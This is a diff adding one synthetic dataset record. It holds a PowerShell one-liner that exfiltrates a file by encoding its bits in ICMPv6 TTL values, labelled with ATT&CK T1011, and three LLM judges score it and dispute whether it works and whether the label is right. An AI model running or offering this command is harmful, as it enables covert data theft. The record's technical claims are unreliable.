@@ -1,0 +1,57 @@
+{
+  "technique_id": "T1011",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "$d='fd00:0:0:1::7'; $bytes=[IO.File]::ReadAllBytes('C:\\Users\\Public\\report.bin'); foreach($b in $bytes){ ([Convert]::ToString($b,2).PadLeft(8,'0')).ToCharArray() | ForEach-Object { $ttl = if($_ -eq '1'){61}else{113}; Test-Connection -ComputerName $d -Count 1 -TimeToLive $ttl -IPv6 -Quiet | Out-Null } }",
+  "explanation": "Encodes bits of each byte into the Time To Live (TTL) of ICMPv6 echo requests, using ICMP as an alternate network medium per T1011.",
+  "rationale_steps": [
+    "Convert each byte to an 8-bit binary string.",
+    "Map bit values to distinct TTLs to represent 0/1.",
+    "Transmit ICMPv6 echos with selected TTLs to a ULA destination."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1011-f38205c7-67d2d587",
+  "source_prompt_hash": "f38205c7",
+  "timestamp_utc": "2025-09-30T08:38:57.416507Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "The PowerShell one-liner is well-formed with balanced quotes/braces, proper separators, and valid parameter syntax, so it will parse correctly.",
+        "semantic_score": 2,
+        "semantic_justification": "It plausibly exfiltrates data by encoding bits in ICMPv6 hop-limit/TTL values, but this is an alternative protocol channel rather than a different network medium (e.g., cellular, Wi-Fi, Bluetooth) as defined by T1011.",
+        "combined_score": 3.5,
+        "confidence": 0.8,
+        "timestamp": "2025-10-01T00:25:59.644194Z"
+      },
+      {
+        "model": "claude-sonnet-4-6",
+        "syntactic_score": 5,
+        "syntactic_justification": "The PowerShell command is well-formed with balanced quotes, braces, and parentheses, proper use of semicolons, pipeline operators, and valid .NET method calls throughout.",
+        "semantic_score": 4,
+        "semantic_justification": "The command correctly implements a covert TTL-based bit-encoding exfiltration channel over ICMPv6 to an IPv6 address, which aligns well with T1011's concept of using an alternate network medium; however, Test-Connection's -TimeToLive parameter may not reliably set the TTL on outgoing packets in all Windows/PowerShell versions, and the receiver-side infrastructure to decode TTL values is not addressed, slightly reducing operational plausibility.",
+        "combined_score": 4.5,
+        "confidence": 0.82,
+        "timestamp": "2026-02-18T21:58:17.683462Z"
+      },
+      {
+        "model": "gemini-3-flash-preview",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed PowerShell code with balanced parentheses, braces, and quotes, and follows standard pipelining and variable assignment rules.",
+        "semantic_score": 2,
+        "semantic_justification": "The command fails semantically for two reasons: 1) the 'Test-Connection' cmdlet does not have a '-TimeToLive' parameter in any standard PowerShell version (it is '-MaxHops' in PowerShell 7+ and unsupported in 5.1), and 2) the command is misclassified as T1011 (Other Network Medium) when it actually describes T1048 (Alternative Protocol), as ICMP is a protocol, not a physical network medium.",
+        "combined_score": 3.5,
+        "confidence": 1,
+        "timestamp": "2026-02-18T21:58:47.332370Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 2.667,
+    "llm_average_score": 3.833,
+    "llm_verdict": "uncertain",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
